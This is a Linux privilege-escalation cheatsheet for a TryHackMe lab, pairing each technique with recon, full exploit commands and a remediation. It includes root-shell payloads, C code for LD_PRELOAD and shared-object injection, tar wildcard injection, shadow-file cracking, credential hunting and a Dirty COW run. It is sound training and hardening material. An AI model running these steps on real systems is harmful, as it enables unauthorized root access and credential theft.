🐧 Linux PrivEsc Cheatsheet

Recon → Exploitation → Remediation, per technique. (TryHackMe "Linux PrivEsc" room)

02MySQL UDF (running as root, no password)

Why it works

mysqld process itself runs as the root OS user, and root's MySQL account has no password. MySQL lets you register a User Defined Function backed by a compiled .so — once loaded, that function runs arbitrary shell commands with mysqld's privileges, i.e. root.

Recon

ps aux | grep mysql
mysql -u root        # try blank password

Exploit

cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
  use mysql;
  create table foo(line blob);
  insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
  select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
  create function do_system returns integer soname 'raptor_udf2.so';
  select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
/tmp/rootbash -p

🛡 Set a MySQL root password, run the service as a dedicated non-root user, disable UDF creation (secure_file_priv), restrict plugin dir write access.

03Readable /etc/shadow

Why it works

/etc/shadow should only be readable by root (via the shadow group). If permissions are loose, any local user can copy out the password hashes and crack them offline at leisure.

Recon

ls -la /etc/shadow
cat /etc/shadow

Exploit

unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
john combined.txt --show

🛡 chmod 640 /etc/shadow, owner root:shadow, never world-readable.

04Writable /etc/shadow

Why it works

The OS trusts whatever hash sits next to a username in /etc/shadow. If the file is writable, you don't need to crack anything — just overwrite root's hash with one you generated yourself, whose plaintext you know.

Recon

ls -la /etc/shadow

Exploit

mkpasswd -m sha-512 newpassword     # generate hash
# or: openssl passwd -1 newpassword
nano /etc/shadow      # replace root's hash with the generated one
su root

🛡 Remove world/group write on /etc/shadow (640 root:shadow); audit for stray setuid helper scripts that write to it.

05Writable /etc/passwd

Why it works

/etc/passwd's password field can hold a crypt hash directly, bypassing /etc/shadow entirely (legacy behavior). If the file is writable, appending a line with UID 0 creates a second root account whose password you control.

Recon

ls -la /etc/passwd

Exploit

openssl passwd newpassword          # legacy crypt hash
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

🛡 chmod 644 /etc/passwd, owner root:root, never group/world-writable.

06Sudo — Shell Escape Sequences (GTFOBins)

Why it works

sudo grants the full privileges of the target binary, not just its intended function. Many interactive tools (pagers, editors, find) have a built-in "run a command" or "!shell" feature — invoking it from inside spawns a shell that inherits sudo's root context.

Recon

sudo -l

Exploit (examples)

sudo less /etc/hosts     # then inside less: !/bin/sh
sudo vi -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'

🛡 Avoid granting sudo on interactive/text-editor/file-manager binaries; use --restrict/wrapper scripts; check GTFOBins before allow-listing a binary.

07Sudo — Environment Variables (LD_PRELOAD / env_keep)

Why it works

sudo normally resets the environment, but sudoers can whitelist variables via env_keep. If LD_PRELOAD survives, the dynamic linker loads your shared object before the real program runs — your constructor code executes first, already running as root.

Recon

sudo -l     # look for env_keep+=LD_PRELOAD or NOPASSWD entries

Exploit

cat << EOF > /tmp/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed-binary>

🛡 Don't keep LD_PRELOAD/LD_LIBRARY_PATH in env_keep; use Defaults env_reset and secure_path in sudoers.

08Cron Jobs — File Permissions

Why it works

A script scheduled by root's crontab runs with root's privileges every time it fires — regardless of who last edited it. If a low-privileged user can write to that script, their added commands run as root on the next trigger.

Recon

cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.*/
pspy64     # watch processes live if available

Exploit

# if a root-run script is world/group writable:
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /path/to/script.sh
# wait for cron to fire, then:
/tmp/rootbash -p

🛡 chmod 700 + root-owned for scripts triggered by root's cron; never let non-root users write to them.

09Cron Jobs — PATH Environment Variable

Why it works

If a cron job calls a command by relative/bare name instead of a full path, the shell searches cron's PATH in order. A writable directory listed before the real binary's location lets you drop a same-named file that gets executed instead — as root.

Recon

cat /etc/crontab      # look for a relative-path command + PATH line
ls -la /home/user

Exploit

# if cron's PATH includes a writable dir (e.g. /home/user) before system dirs
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# wait, then:
/tmp/rootbash -p

🛡 Always use absolute paths inside cron scripts and set an explicit, safe PATH in crontab.

10Cron Jobs — Wildcards (wildcard injection / "tar checkpoint")

Why it works

When a root cron job runs "tar * " or similar, the shell expands * to every filename in the directory before tar sees it. Filenames crafted to look like command-line flags (e.g. --checkpoint-action=exec=...) get parsed as real options, letting you smuggle a command into a root-run tool.

Recon

cat /etc/crontab      # look for tar/chown/rsync with a wildcard (*) argument

Exploit

cd /target/dir
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# wait for cron's tar * to run, then:
/tmp/rootbash -p

🛡 Avoid wildcards in privileged scripts; use -- to stop option parsing, or reference files explicitly.

11SUID/SGID — Known Exploits (GTFOBins binaries)

Why it works

The SUID bit makes a binary always run as its owner (root), no matter who launches it. If that binary is on GTFOBins with a documented shell-escape or file-read/write feature, you get root-level behavior just by running it normally.

Recon

find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
# cross-check each binary name on gtfobins.github.io

Exploit (example: nmap old interactive mode)

nmap --interactive
nmap> !sh

🛡 Remove unnecessary SUID bits (chmod u-s); patch/upgrade binaries with known GTFOBins SUID abuse paths.

12SUID/SGID — Shared Object Injection

Why it works

The binary dynamically loads a library without pinning its exact path, so the linker searches a list of directories. If one of those is writable, you plant a fake .so with the same name — its constructor runs automatically, already inheriting the SUID binary's root privileges.

Recon

strace ./suid_binary 2>&1 | grep -iE 'open|stat' | grep -i "no such file"

Exploit

cat << EOF > /path/missing_lib.c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() { setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /path/missing_lib.so.6 /path/missing_lib.c
./suid_binary

🛡 Set absolute RPATH, avoid loading libraries from writable/relative directories, keep LD_LIBRARY_PATH out of trusted execution.

13SUID/SGID — Environment Variables

Why it works

Instead of using a hardcoded full path, the SUID program calls an external command by bare name (e.g. "service") and relies on the inherited PATH to find it. Prepending a writable directory to PATH with your own fake "service" script makes the root process run your code.

Recon

strings suid_binary | grep -iE '^[a-z_]+$'   # look for commands called without full path, e.g. "service"

Exploit

cd /tmp
echo '/bin/bash -p' > service
chmod +x service
export PATH=/tmp:$PATH
./suid_binary

🛡 Call system binaries with full absolute paths inside SUID programs; drop inherited/untrusted PATH and env vars before system()/exec() calls.

14SUID/SGID — Abusing Shell Features #1 (bash <4.2-048 function export)

Why it works

Older bash versions let you export a shell function into the environment under a command's own name. When the SUID binary internally invokes that command name via a shell, your exported function definition runs instead of the real binary — as root.

Recon

bash --version
ls -la suid_binary      # calls a command like "service apache2 start"

Exploit

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
./suid_binary

🛡 Upgrade bash past 4.4+ (CVE-2014-6271/Shellshock-era fix); don't call shell built-ins/externals by bare name from SUID C wrappers.

15SUID/SGID — Abusing Shell Features #2 (-p flag / setuid bash)

Why it works

Modern bash drops its elevated effective UID back to the real UID as a safety measure — unless started with -p, which tells it "keep the privileges you were given." If a SUID binary (or you, on an SUID-bash target) launches bash with -p, that safety net never kicks in.

Recon

find / -perm -4000 -type f 2>/dev/null | grep bash

Exploit

# if the SUID binary itself drops into a root-owned bash
./suid_binary -p
# or directly, if bash has SUID bit:
bash -p

🛡 Never set SUID on bash/other full shells; modern bash drops privileges unless invoked with -p — don't rely on that as a safety net either.

16Passwords & Keys — History Files

Why it works

Shells and CLI tools log every command you type to a history file in plaintext. If someone ever typed a password as a command-line argument (mysql -ppassword, su root < password, etc.), it sits readable in that history file forever.

Recon / Exploit

cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history ~/.vim_history
grep -iE 'pass|pwd|secret' ~/.*history 2>/dev/null

🛡 Never pass secrets as CLI args/inline commands; export HISTFILE=/dev/null or clear history for privileged sessions; rotate any leaked creds.

17Passwords & Keys — Config Files

Why it works

Applications often store database or service credentials as plaintext in config files for simplicity. Those credentials frequently get reused for the root/admin account too, or directly unlock a service running with elevated privileges.

Recon / Exploit

find / -iname "*.conf" -o -iname "*config*" 2>/dev/null | grep -v proc
grep -riE "password|passwd|pwd|secret" /var/www /etc 2>/dev/null
cat /var/www/html/*/wp-config.php

🛡 Restrict config file perms to the owning service account only; store secrets in a vault/env-injected at runtime, not plaintext config.

18Passwords & Keys — SSH Keys

Why it works

SSH key-based auth trusts whoever holds the private key — no password needed. An unencrypted private key left readable by other users (or exposed in a backup/web root) lets anyone impersonate its owner on any server that trusts the matching public key.

Recon

find / -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null
ls -la ~/.ssh /root/.ssh 2>/dev/null

Exploit

chmod 600 id_rsa
ssh -i id_rsa root@target

🛡 Keep private keys 600, readable only by the owner; never store unencrypted keys in web roots or world-readable dirs; use passphrase-protected keys.

19NFS — no_root_squash

Why it works

By default NFS maps a remote client's root user down to "nobody" on the server (root_squash), to stop exactly this attack. If an export disables that (no_root_squash), a file you create as root on your own machine keeps its root ownership and SUID bit once it lands on the shared mount.

Recon

# on target
cat /etc/exports
# on attacker
showmount -e <target-ip>

Exploit

mkdir /tmp/nfs
mount -o rw,vers=2 <target-ip>:/share /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +xs /tmp/nfs/rootbash
# on target, via the mounted share:
/share/rootbash -p

🛡 Use root_squash (default) in /etc/exports; restrict exports to specific hosts and set no_suid.

20Kernel Exploits

Why it works

The kernel enforces every permission check in the system — a bug inside it bypasses those checks directly rather than tricking a program into misusing its own privileges. Dirty COW, for example, exploited a race condition in the copy-on-write memory handling to let any local user write to files they should only be able to read.

Recon

uname -a
cat /etc/os-release
searchsploit "Linux Kernel $(uname -r)"

Exploit (example: Dirty COW CVE-2016-5195)

gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword
su firefart

🛡 Keep the kernel patched/updated; use live-patching (kpatch/kgraft) where reboot isn't feasible; test kernel exploits only in the lab, not blindly in prod.
